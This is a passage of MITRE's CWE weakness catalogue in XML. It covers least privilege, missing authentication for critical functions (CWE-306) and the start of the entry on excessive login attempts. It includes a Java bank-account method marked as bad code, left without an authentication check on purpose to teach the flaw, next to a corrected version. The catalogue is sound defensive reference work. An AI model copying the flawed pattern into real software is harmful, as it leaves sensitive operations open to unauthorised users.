                     <Code>userCurrLocation = locationClient.getLastLocation();</Code>
                     <Code>deriveStateFromCoords(userCurrLocation);</Code>
                  </Block>
                  <Text>While the application needs this information, it does not need to use
							the ACCESS_FINE_LOCATION permission, as the ACCESS_COARSE_LOCATION
							permission will be sufficient to identify which US state the user is
							in.</Text>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2007-4217</Observed_Example_Reference>
               <Observed_Example_Description>FTP client program on a certain OS runs with
						setuid privileges and has a buffer overflow. Most clients do not need extra
						privileges, so an overflow is not a vulnerability for those clients.
					</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-1877</Observed_Example_Reference>
               <Observed_Example_Description>Program runs with privileges and calls another
						program with the same privileges, which allows read of arbitrary files.
					</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2007-5159</Observed_Example_Reference>
               <Observed_Example_Description>OS incorrectly installs a program with setuid
						privileges, allowing users to gain privileges.
					</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-4638</Observed_Example_Reference>
               <Observed_Example_Description>Composite: application running with high
						privileges allows user to specify a restricted file to process, which
						generates a parsing error that leaks the contents of the file.
					</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-0162</Observed_Example_Reference>
               <Observed_Example_Description>Program does not drop privileges before calling
						another program, allowing code execution.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-0368</Observed_Example_Reference>
               <Observed_Example_Description>setuid root program allows creation of arbitrary
						files through command line argument.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2007-3931</Observed_Example_Reference>
               <Observed_Example_Description>Installation script installs some programs as
						setuid when they shouldn't be.</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference Local_Reference_ID="R.250.1">
               <Reference_Author>Jerome H. Saltzer</Reference_Author>
               <Reference_Author>Michael D. Schroeder</Reference_Author>
               <Reference_Title>The Protection of Information in Computer
						Systems</Reference_Title>
               <Reference_Publication>Proceedings of the IEEE 63</Reference_Publication>
               <Reference_PubDate>September, 1975</Reference_PubDate>
               <Reference_Link>http://web.mit.edu/Saltzer/www/publications/protection/</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-31" Local_Reference_ID="R.250.2">
               <Reference_Author>Sean Barnum</Reference_Author>
               <Reference_Author>Michael Gegick</Reference_Author>
               <Reference_Title>Least Privilege</Reference_Title>
               <Reference_PubDate>2005-09-14</Reference_PubDate>
               <Reference_Link>https://buildsecurityin.us-cert.gov/daisy/bsi/articles/knowledge/principles/351.html</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-11" Local_Reference_ID="R.250.3">
               <Reference_Author>M. Howard</Reference_Author>
               <Reference_Author>D. LeBlanc</Reference_Author>
               <Reference_Title>Writing Secure Code</Reference_Title>
               <Reference_Section>Chapter 7, "Running with Least Privilege" Page
						207</Reference_Section>
               <Reference_Edition>2nd Edition</Reference_Edition>
               <Reference_Publisher>Microsoft</Reference_Publisher>
               <Reference_PubDate>2002</Reference_PubDate>
            </Reference>
            <Reference Reference_ID="REF-24" Local_Reference_ID="R.250.4">
               <Reference_Author>NIST</Reference_Author>
               <Reference_Title>Federal Desktop Core Configuration</Reference_Title>
               <Reference_Link>http://nvd.nist.gov/fdcc/index.cfm</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-17" Local_Reference_ID="R.250.5">
               <Reference_Author>Michael Howard</Reference_Author>
               <Reference_Author>David LeBlanc</Reference_Author>
               <Reference_Author>John Viega</Reference_Author>
               <Reference_Title>24 Deadly Sins of Software Security</Reference_Title>
               <Reference_Section>"Sin 16: Executing Code With Too Much Privilege." Page
						243</Reference_Section>
               <Reference_Publication>McGraw-Hill</Reference_Publication>
               <Reference_PubDate>2010</Reference_PubDate>
            </Reference>
            <Reference Reference_ID="REF-7" Local_Reference_ID="R.250.6">
               <Reference_Author>Mark Dowd</Reference_Author>
               <Reference_Author>John McDonald</Reference_Author>
               <Reference_Author>Justin Schuh</Reference_Author>
               <Reference_Title>The Art of Software Security Assessment</Reference_Title>
               <Reference_Section>Chapter 9, "Privilege Vulnerabilities", Page
						477.</Reference_Section>
               <Reference_Edition>1st Edition</Reference_Edition>
               <Reference_Publisher>Addison Wesley</Reference_Publisher>
               <Reference_PubDate>2006</Reference_PubDate>
            </Reference>
         </References>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="7 Pernicious Kingdoms">
               <Mapped_Node_Name>Often Misused: Privilege Management</Mapped_Node_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT Java Secure Coding">
               <Mapped_Node_Name>Minimize privileges before deserializing from a privilege
						context</Mapped_Node_Name>
               <Mapped_Node_ID>SER09-J</Mapped_Node_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>104</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>470</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>69</CAPEC_ID>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission Submission_Source="Externally_Mined">
               <Submitter>7 Pernicious Kingdoms</Submitter>
            </Submission>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Description, Modes_of_Introduction, Relationships,
						Other_Notes, Relationship_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description,
						Maintenance_Notes</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description,
						Likelihood_of_Exploit, Maintenance_Notes, Name, Observed_Examples,
						Other_Notes, Potential_Mitigations, Relationships,
						Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Potential_Mitigations,
						References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Detection_Factors,
						Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Related_Attack_Patterns,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Previous_Entry_Names>
               <Previous_Entry_Name Name_Change_Date="2008-01-30">Often Misused: Privilege
						Management</Previous_Entry_Name>
               <Previous_Entry_Name Name_Change_Date="2009-01-12">Design Principle Violation:
						Failure to Use Least Privilege</Previous_Entry_Name>
            </Previous_Entry_Names>
         </Content_History>
      </Weakness>
                    <Weakness ID="306" Name="Missing Authentication for Critical Function" Weakness_Abstraction="Variant" Status="Draft">
         <Description>
            <Description_Summary>The software does not perform any authentication for
					functionality that requires a provable user identity or consumes a significant
					amount of resources.</Description_Summary>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>866</Relationship_Target_ID>
               <!--2011 Top 25 - Porous Defenses--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">800</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>803</Relationship_Target_ID>
               <!--2010 Top 25 - Porous Defenses--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">1003</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>287</Relationship_Target_ID>
               <!--Improper Authentication--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">809</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>812</Relationship_Target_ID>
               <!--OWASP Top Ten 2010 Category A3 - Broken Authentication and Session Management--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">888</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>952</Relationship_Target_ID>
               <!--SFP Secondary Cluster: Missing Authentication--></Relationship>
         </Relationships>
         <Relationship_Notes>
            <Relationship_Note>
               <Text>This is separate from "bypass" issues in which authentication exists, but
						is faulty.</Text>
            </Relationship_Note>
         </Relationship_Notes>
         <Applicable_Platforms>
            <Languages>
               <Language_Class Language_Class_Description="Language-independent"/>
            </Languages>
         </Applicable_Platforms>
         <Time_of_Introduction>
            <Introductory_Phase>Architecture and Design</Introductory_Phase>
         </Time_of_Introduction>
         <Likelihood_of_Exploit>Medium to High</Likelihood_of_Exploit>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Access_Control</Consequence_Scope>
               <Consequence_Scope>Other</Consequence_Scope>
               <Consequence_Technical_Impact>Gain privileges / assume
						identity</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Other</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text> Exposing critical functionality essentially provides an attacker with
							the privilege level of that functionality. The consequences will depend
							on the associated functionality, but they can range from reading or
							modifying sensitive data, access to administrative or other privileged
							functionality, or possibly even execution of arbitrary code.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-7.2">
               <Method_Name>Manual Analysis</Method_Name>
               <Method_Description>
                  <Text>This weakness can be detected using tools and techniques that require
							manual (human) analysis, such as penetration testing, threat modeling,
							and interactive tools that allow the tester to record and modify an
							active session. </Text>
                  <Text>Specifically, manual static analysis is useful for evaluating the
							correctness of custom authentication mechanisms.</Text>
               </Method_Description>
               <Method_Effectiveness_Notes>
                  <Text> These may be more effective than strictly automated techniques. This
							is especially the case with weaknesses that are related to design and
							business rules.</Text>
               </Method_Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-6.1">
               <Method_Name>Automated Static Analysis</Method_Name>
               <Method_Description>
                  <Text>Automated static analysis is useful for detecting commonly-used idioms
							for authentication. A tool may be able to analyze related configuration
							files, such as .htaccess in Apache web servers, or detect the usage of
							commonly-used authentication libraries.</Text>
                  <Text>Generally, automated static analysis tools have difficulty detecting
							custom authentication schemes. In addition, the software's design may
							include some functionality that is accessible to any user and does not
							require an established identity; an automated technique that detects the
							absence of authentication may report false positives.</Text>
               </Method_Description>
               <Method_Effectiveness>Limited</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Binary / Bytecode disassembler - then use manual analysis for
									vulnerabilities &amp; anomalies</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with automated results
						interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Web Application Scanner</Text>
                        <Text>Web Services Scanner</Text>
                        <Text>Database Scanners</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with manual results interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Host Application Interface Scanner</Text>
                        <Text>Fuzz Tester</Text>
                        <Text>Framework-based Fuzzer</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Focused Manual Spotcheck - Focused manual analysis of
									source</Text>
                        <Text>Manual Source Code Review (not inspections)</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Source code Weakness Analyzer</Text>
                        <Text>Context-configured Source Code Weakness Analyzer</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Architecture / Design Review</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Inspection (IEEE 1028 standard) (can apply to requirements,
									design, source code, etc.)</Text>
                        <Text>Formal Methods / Correct-By-Construction</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Attack Modeling</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Divide the software into anonymous, normal, privileged, and
							administrative areas. Identify which of these areas require a proven
							user identity, and use a centralized authentication capability.</Text>
                  <Text>Identify all potential communication channels, or other means of
							interaction with the software, to ensure that all channels are
							appropriately protected. Developers sometimes perform authentication at
							the primary channel, but open up a secondary channel that is assumed to
							be private. For example, a login mechanism may be listening on one
							network port, but after successful authentication, it may open up a
							second port where it waits for the connection, but avoids authentication
							because it assumes that only the authenticated party will connect to the
							port.</Text>
                  <Text>In general, if the software or protocol allows a single session or
							user state to persist across multiple connections or channels,
							authentication and appropriate credential management need to be used
							throughout.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>For any security checks that are performed on the client side, ensure
							that these checks are duplicated on the server side, in order to avoid
							CWE-602. Attackers can bypass the client-side checks by modifying values
							after the checks have been performed, or by changing the client to
							remove the client-side checks entirely. Then, these modified values
							would be submitted to the server.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Where possible, avoid implementing custom authentication routines and
							consider using authentication capabilities as provided by the
							surrounding framework, operating system, or environment. These may make
							it easier to provide a clear separation between authentication tasks and
							authorization tasks.</Text>
                  <Text>In environments such as the World Wide Web, the line between
							authentication and authorization is sometimes blurred. If custom
							authentication routines are required instead of those provided by the
							server, then these routines must be applied to every single page, since
							these pages could be requested directly.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4.5">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Libraries or Frameworks</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use a vetted library or framework that does not allow this weakness to
							occur or provides constructs that make this weakness easier to
							avoid.</Text>
                  <Text>For example, consider using libraries with authentication capabilities
							such as OpenSSL or the ESAPI Authenticator [R.306.3].</Text>
               </Mitigation_Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In the following Java example the method createBankAccount is used
						to create a BankAccount object for a bank management
						application.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>public BankAccount createBankAccount(String accountNumber, String
								accountType, </Code>
                     <Code>String accountName, String accountSSN, double balance) {</Code>
                     <Code/>
                     <Block>
                        <Code>BankAccount account = new BankAccount();</Code>
                        <Code>account.setAccountNumber(accountNumber);</Code>
                        <Code>account.setAccountType(accountType);</Code>
                        <Code>account.setAccountOwnerName(accountName);</Code>
                        <Code>account.setAccountOwnerSSN(accountSSN);</Code>
                        <Code>account.setBalance(balance);</Code>
                        <Code/>
                        <Code>return account;</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text> However, there is no authentication mechanism to ensure that the user
							creating this bank account object has the authority to create new bank
							accounts. Some authentication mechanisms should be used to verify that
							the user has the authority to create bank account objects. </Text>
                  <Text> The following Java code includes a boolean variable and method for
							authenticating a user. If the user has not been authenticated then the
							createBankAccount will not create the bank account object. </Text>
                  <Block Block_Nature="Good_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>private boolean isUserAuthentic = false;</Code>
                     <Code/>
                     <Comment>// authenticate user, </Comment>
                     <Comment>// if user is authenticated then set variable to true</Comment>
                     <Comment>// otherwise set variable to false</Comment>
                     <Code>public boolean authenticateUser(String username, String password)
								{</Code>
                     <Block>
                        <Code>...</Code>
                     </Block>
                     <Code>}</Code>
                     <Code/>
                     <Code>public BankAccount createNewBankAccount(String accountNumber,
								String accountType, </Code>
                     <Code>String accountName, String accountSSN, double balance) {</Code>
                     <Block>
                        <Code>BankAccount account = null;</Code>
                        <Code/>
                        <Code>if (isUserAuthentic) {</Code>
                        <Block>
                           <Code>account = new BankAccount();</Code>
                           <Code>account.setAccountNumber(accountNumber);</Code>
                           <Code>account.setAccountType(accountType);</Code>
                           <Code>account.setAccountOwnerName(accountName);</Code>
                           <Code>account.setAccountOwnerSSN(accountSSN);</Code>
                           <Code>account.setBalance(balance);</Code>
                        </Block>
                        <Code>}</Code>
                        <Code>return account;</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2002-1810</Observed_Example_Reference>
               <Observed_Example_Description>MFV. Access TFTP server without authentication and
						obtain configuration file with sensitive plaintext
						information.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-6827</Observed_Example_Reference>
               <Observed_Example_Description>Agent software running at privileges does not
						authenticate incoming requests over an unprotected channel, allowing a
						Shatter" attack.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2004-0213</Observed_Example_Reference>
               <Observed_Example_Description>Product enforces restrictions through a GUI but
						not through privileged APIs.</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference Reference_ID="REF-7" Local_Reference_ID="R.306.1">
               <Reference_Author>Mark Dowd</Reference_Author>
               <Reference_Author>John McDonald</Reference_Author>
               <Reference_Author>Justin Schuh</Reference_Author>
               <Reference_Title>The Art of Software Security Assessment</Reference_Title>
               <Reference_Section>Chapter 2, "Common Vulnerabilities of Authentication," Page
						36</Reference_Section>
               <Reference_Edition>1st Edition</Reference_Edition>
               <Reference_Publisher>Addison Wesley</Reference_Publisher>
               <Reference_PubDate>2006</Reference_PubDate>
            </Reference>
            <Reference Local_Reference_ID="R.306.2">
               <Reference_Author>Frank Kim</Reference_Author>
               <Reference_Title>Top 25 Series - Rank 19 - Missing Authentication for Critical
						Function</Reference_Title>
               <Reference_Publisher>SANS Software Security Institute</Reference_Publisher>
               <Reference_Date>2010-02-23</Reference_Date>
               <Reference_Link>http://blogs.sans.org/appsecstreetfighter/2010/02/23/top-25-series-rank-19-missing-authentication-for-critical-function/</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-21" Local_Reference_ID="R.306.3">
               <Reference_Author>OWASP</Reference_Author>
               <Reference_Title>OWASP Enterprise Security API (ESAPI) Project</Reference_Title>
               <Reference_Link>http://www.owasp.org/index.php/ESAPI</Reference_Link>
            </Reference>
         </References>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="PLOVER">
               <Mapped_Node_Name>No Authentication for Critical Function</Mapped_Node_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="Software Fault Patterns">
               <Mapped_Node_Name>Missing authentication</Mapped_Node_Name>
               <Mapped_Node_ID>SFP31</Mapped_Node_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>225</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>12</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>36</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>40</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>62</CAPEC_ID>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission Submission_Source="Externally_Mined">
               <Submitter>PLOVER</Submitter>
            </Submission>
            <Modification Modification_Source="External">
               <Modifier>Eric Dalci</Modifier>
               <Modifier_Organization>Cigital</Modifier_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Relationship_Notes,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences,
						Demonstrative_Examples, Detection_Factors, Likelihood_of_Exploit, Name,
						Observed_Examples, Potential_Mitigations, References,
						Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Potential_Mitigations,
						References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Previous_Entry_Names>
               <Previous_Entry_Name Name_Change_Date="2010-02-16">No Authentication for
						Critical Function</Previous_Entry_Name>
            </Previous_Entry_Names>
         </Content_History>
      </Weakness>
                    <Weakness ID="307" Name="Improper Restriction of Excessive Authentication Attempts" Weakness_Abstraction="Base" Status="Draft">
         <Description>
            <Description_Summary>The software does not implement sufficient measures to prevent
					multiple failed authentication attempts within in a short time frame, making it
					more susceptible to brute force attacks.</Description_Summary>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>866</Relationship_Target_ID>
               <!--2011 Top 25 - Porous Defenses--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">800</Relationship_View_ID>
